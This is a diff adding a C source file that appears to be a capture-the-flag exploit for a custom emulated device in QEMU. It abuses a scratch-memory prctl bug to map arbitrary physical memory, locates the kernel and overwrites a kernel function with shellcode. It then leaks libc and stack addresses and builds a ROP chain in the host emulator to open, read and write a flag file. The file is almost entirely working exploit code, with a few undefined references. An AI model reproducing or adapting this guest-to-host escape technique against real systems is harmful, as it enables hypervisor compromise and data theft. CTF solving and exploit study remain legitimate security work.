@@ -1,0 +1,336 @@
+#define _GNU_SOURCE
+#include <arpa/inet.h>
+#include <assert.h>
+#include <errno.h>
+#include <fcntl.h>
+#include <inttypes.h>
+#include <netinet/in.h>
+#include <poll.h>
+#include <pthread.h>
+#include <sched.h>
+#include <stdbool.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/io.h>
+#include <sys/ioctl.h>
+#include <sys/ipc.h>
+#include <sys/mman.h>
+#include <sys/msg.h>
+#include <sys/prctl.h>
+#include <sys/socket.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <sys/ucontext.h>
+#include <sys/un.h>
+#include <syscall.h>
+#include <time.h>
+#include <unistd.h>
+
+
+#include <stdio.h>
+#include <stdint.h>
+#include <stdlib.h>
+#include <string.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <sys/prctl.h>
+#include <sys/wait.h>
+
+
+typedef struct scratch_info
+{
+    uint64_t scratch_addr;
+    uint64_t scratch_default_size;
+    uint32_t scratch_max_slice_size;
+    uint16_t scratch_max_slice_count;
+} scratch_info;
+
+void get_scratch_info(scratch_info* info);
+void load_scratch(uint64_t slice, uint64_t slice_offset, void* source, uint64_t length);
+void read_scratch(uint64_t slice, uint64_t slice_offset, void* destination, uint64_t length);
+void clear_scratch();
+void add_slices(uint64_t slice_a, uint64_t slice_b, uint64_t slice_c);
+void sub_slices(uint64_t slice_a, uint64_t slice_b, uint64_t slice_c);
+void mul_slices(uint64_t slice_a, uint64_t slice_b, uint64_t slice_c);
+uint64_t get_scratch_hole();
+
+#define AI1337_SCRATCH_VA_BASE   0xFFFFFFFFFFA00000ULL
+#define AI1337_SCRATCH_PHYS_BASE 0xFFFFFFFFFFF00000ULL
+#define AI1337_SCRATCH_SIZE (33ULL * 1024)
+#define AI1337_SCRATCH_MAX_NUM_SLICES (128)
+#define AI1337_SCRATCH_SLICE_SIZE_DEFAULT (1024ULL)
+#define AI1337_SCRATCH_NUM_SLICES_DEFAULT (33UL)
+#define AI1337_SCRATCH_MAX_SLICE_SIZE (4096ULL)
+
+#define TARGET_PAGE_BITS 12
+
+# define TARGET_PAGE_MASK    ((int64_t)-1 << TARGET_PAGE_BITS)
+
+void hexdump(void* size, size_t length)
+{
+    uint8_t* data = size;
+    for (size_t i = 0; i < length; i++)
+    {
+        printf("%02x ", data[i]);
+        if (i % 16 == 15)
+        {
+            printf("\n");
+        }
+    }
+    printf("\n");
+}
+
+#define PR_SET_SCRATCH_HOLE		0x53534352
+
+#define MSR_HACK4_SLICE_SIZE            0xc0000105
+#define MSR_HACK4_NUM_SLICES            0xc0000106
+
+void* bug(uint64_t phys_addr)
+{
+    uint64_t need = phys_addr;
+    uint64_t va_base = 0xffffffffffdff000;
+
+    uint64_t diff = need - 0x100000;
+    va_base -= diff;
+    uint64_t phys_base = AI1337_SCRATCH_PHYS_BASE;
+    uint64_t addr = 0xffffffffffffffff;
+
+    uint64_t paddr = phys_base + (addr - va_base);
+    uint64_t ppage = paddr & TARGET_PAGE_MASK;
+    printf(" %lx -> %lx\n", va_base, ppage);
+    int res = prctl(PR_SET_SCRATCH_HOLE, va_base, 0, 0, 0);
+    printf("prctl res: %d\n", res);
+
+
+    uint8_t* ptr = (uint64_t*)addr;
+    uint64_t vv = *ptr;
+    printf("vv: %lx\n", vv);
+
+    ptr = addr & TARGET_PAGE_MASK;
+
+    uint32_t* ptr2 = addr & TARGET_PAGE_MASK;
+    return ptr;
+}
+
+static void segv_handler(int sig, siginfo_t* info, void* puc)
+{
+    ucontext_t* uc = puc;
+    unsigned char* pc;
+
+    if (sig != SIGSEGV)
+    {
+        abort();
+    }
+
+    (void)info;
+
+    pc = (unsigned char*)uc->uc_mcontext.gregs[REG_RIP];
+    if (pc[0] == 0x0f && pc[1] == 0x0a && (pc[2] == 0x83 || pc[2] == 0x84))
+    {
+        uc->uc_mcontext.gregs[REG_RIP] = (long long)(pc + 3);
+        write(1, "patched\n", 8);
+        return;
+    }
+    abort();
+}
+
+
+int main(int argc, char** argv)
+{
+    size_t slice_size_value = 1024;
+
+    uint64_t* a = malloc(slice_size_value);
+    read_scratch(0, 0, a, slice_size_value);
+    *a = 0xcafebabe;
+    load_scratch(0, 0, a, slice_size_value);
+
+
+    int pid = fork();
+    if (pid == 0)
+    {
+        void* a = malloc(slice_size_value);
+        printf("child\n");
+        // trigger sigsegv, keep the access flag enabled to allow arbitrary instructions to trigger patched tlb logic
+        load_scratch(36, 0, a, slice_size_value);
+        printf("child done\n");
+        return 0;
+    }
+    printf("parent\n");
+
+    int waitres = wait(NULL);
+    printf("wait res: %d\n", waitres);
+
+
+    //#define CONFIG_PHYSICAL_START 0x1000000
+    //#define CONFIG_PHYSICAL_ALIGN 0x200000
+    int step = 1;
+    uint64_t it;
+    for (int j = 0; j < 1024; j++)
+    {
+        it = 0x1000000;
+        it += 0x200000 * j;
+
+        pid = fork();
+        if (pid == 0)
+        {
+            void* mem = bug(it);
+            uint32_t* dwords = mem;
+            //        ffffffff81000000 <.text>:
+            //ffffffff81000000:       89 f8                   mov    %edi,%eax
+            //ffffffff81000002:       89 f6                   mov    %esi,%esi
+            // 89 f8 89 f6
+            if (*dwords == 0xf689f889)
+            {
+                hexdump(mem, 0x1000);
+                exit(0);
+            }
+
+            exit(1);
+        }
+        else
+        {
+            int status;
+            waitpid(pid, &status, 0);
+            int exit_status = WEXITSTATUS(status);
+            printf("Child exited with status: %d\n", exit_status);
+            if (exit_status == 0)
+            {
+                printf("found elf at %p\n", it);
+                break;
+            }
+        }
+    }
+
+
+    uint64_t sym_prctl_set_scratch_hole = 0xFFFFFFFF81709E40;
+    uint64_t base = 0xffffffff81000000;
+
+    uint64_t diff = sym_prctl_set_scratch_hole - base;
+
+
+    void* mem = bug(it + (diff & TARGET_PAGE_MASK));
+    uint64_t page_offset = diff & ~TARGET_PAGE_MASK;
+    hexdump(mem + page_offset, 0x30);
+
+    uint8_t shellcode[] = {
+0x48, 0xbf, 0x00, 0x00, 0xfe, 0xca, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x0a, 0x89, 0xb9, 0x06, 0x01, 0x00, 0xc0, 0x31, 0xd2, 0xb8, 0x80, 0x00, 0x00, 0x00, 0x0f, 0x30, 0x31, 0xc0, 0xc3
+    };
+    uint8_t shellcode2[] = {
+        0x48, 0x89, 0xf8, 0xf7, 0xc7, 0xff, 0x0f, 0x00, 0x00, 0x75, 0x12, 0x48, 0x3b, 0x3d, 0xce, 0x3b, 0x9e, 0x00,
+        0x72, 0x09, 0x48, 0x89, 0xc7, 0x0f, 0x0a, 0x89, 0x31, 0xc0, 0xc3, 0xb8, 0xea, 0xff
+    };
+    assert(sizeof(shellcode) < 32);
+    for (int i = 0; i < sizeof(shellcode); i++)
+    {
+        *(uint8_t*)(mem + page_offset + i) = shellcode[i];
+    }
+
+    int res = prctl(PR_SET_SCRATCH_HOLE, 0, 0, 0, 0); // trigger shellcode
+    printf("prcntl returned ret = %x\nrecovering...\n", res);
+
+    // recover
+    // for (int i = 0; i < sizeof(shellcode2); i++)
+    // {
+    //     *(uint8_t*)(mem + page_offset + i) = shellcode2[i];
+    // }
+
+    printf("recovered\n");
+
+    // hexdump(mem + page_offset, 0x30);
+
+
+
+    read_scratch(67, 0, a, slice_size_value);
+    hexdump(a, 1024);
+
+// e0 41 00 57 55 55 00 00 1e 9b ed 55 55 55 00 00
+// 00 00 00 00 00 00 00 00 3f f8 f4 55 ff ff ff ff
+// 00 00 00 00 ff ff ff ff b0 38 00 57 55 55 00 00
+// e0 dc ff ff ff 7f 00 00 00 14 b8 dd fb 44 8d 3c
+// e0 b1 f4 56 55 55 00 00 00 00 00 00 00 00 00 00
+// 88 b0 f4 56 55 55 00 00 e4 dc ff ff ff 7f 00 00
+// 98 b0 f4 56 55 55 00 00 00 00 00 00 00 00 00 00
+// a8 b0 f4 56 55 55 00 00 49 84 ac 55 55 55 00 00
+// 18 00 00 00 00 00 00 00 96 74 00 00 00 00 00 00
+// 10 00 00 00 00 00 00 00 00 14 b8 dd fb 44 8d 3c
+// 00 00 00 00 00 00 00 00 58 de ff ff ff 7f 00 00
+// d0 dd ff ff ff 7f 00 00 16 00 00 00 00 00 00 00
+// 00 00 00 00 00 00 00 00 38 a1 25 56 55 55 00 00
+// 00 d0 ff f7 ff 7f 00 00 5a b3 e1 55 55 55 00 00
+// 58 de ff ff ff 7f 00 00 ca a1 42 f7 ff 7f 00 00 << #7  0x00007ffff742a1ca in __libc_start_id
+
+    char shell_cmd [] = "/home/ctf/flag.txt";
+    uint64_t libc_leak = ((uint64_t *)a)[14 * 2 + 1];
+    uint64_t stack_leak = ((uint64_t *)a)[14 * 2 ];
+    uint64_t rop_start_addr = stack_leak -0x120;
+
+    uint64_t libc_base = libc_leak - 0x2a1ca;
+    // uint64_t system = libc_base + 0x58740;
+    uint64_t pop_rdi_ret = libc_base + 0x000000000010f75b; // : pop rdi; ret;
+    uint64_t shell_addr = rop_start_addr + 0x30 + 256;
+    uint64_t pop_rsi_ret = libc_base + 0x0000000000110a4d;//: pop rsi; ret;
+    uint64_t pop_rbp_ret = libc_base + 0x0000000000028a91; //: pop rbp; ret;;
+
+    uint64_t rdx_gadget = libc_base + 0x00000000000f9ebf// : mov edx, 0x100; mov eax, 0x20; cmove rax, rdx; ret;
+;
+
+    int irp = 0;
+
+
+    uint64_t *qwords = (uint64_t *)a + 14 * 2 + 1;
+
+    qwords[irp++] = pop_rdi_ret;
+    qwords[irp++] = shell_addr;
+    qwords[irp++] = pop_rsi_ret;
+    qwords[irp++] = 0;
+    qwords[irp++] = libc_base + 0x11b120; // open64
+
+
+    qwords[irp++] = pop_rdi_ret;
+    qwords[irp++] = 0; // fd
+    // rsi still points to the same address
+    qwords[irp++] = rdx_gadget;
+    qwords[irp++] = libc_base + 0x11ba50; // read;
+
+    qwords[irp++] = pop_rdi_ret;
+    qwords[irp++] = 1; // fd
+    // rsi still points to the same address
+    qwords[irp++] = rdx_gadget;
+    qwords[irp++] = libc_base + 0x11c560; // write
+
+    qwords[irp++] = 0xcafe0009;
+    qwords[irp++] = 0xcafe0010;
+    qwords[irp++] = 0xcafe0011;
+    qwords[irp++] = 0xcafe0012;
+    qwords[irp++] = 0xcafe0013;
+    qwords[irp++] = 0xcafe0014;
+    qwords[irp++] = 0xcafe0015;
+    qwords[irp++] = 0xcafe0016;
+
+    qwords[irp++] = system;
+
+    uint8_t *sc_ptr = (uint8_t *)& ((uint64_t *)a)[14 * 2 + 7 + 32];
+    for (int i = 0; i < sizeof(shell_cmd); i++)
+    {
+        sc_ptr[i] = shell_cmd[i];
+    }
+
+
+
+// #17 0x0000555555e1b363 in qemu_default_main () at ../system/main.c:38
+
+
+    load_scratch(67, 0, a, slice_size_value);
+
+    printf("libc leak %p\n", (void*)libc_leak);
+    printf("libc base %p\n", (void*)libc_base);
+    printf("system %p\n", (void*)system);
+    printf("rop_start_addr %p\n", (void*)rop_start_addr);
+    printf("shell_addr %p\n", (void*)shell_addr);
+    printf("pop_rdi_ret %p\n", (void*)pop_rdi_ret);
+
+    printf("GGWP");
+    return 0;
+}
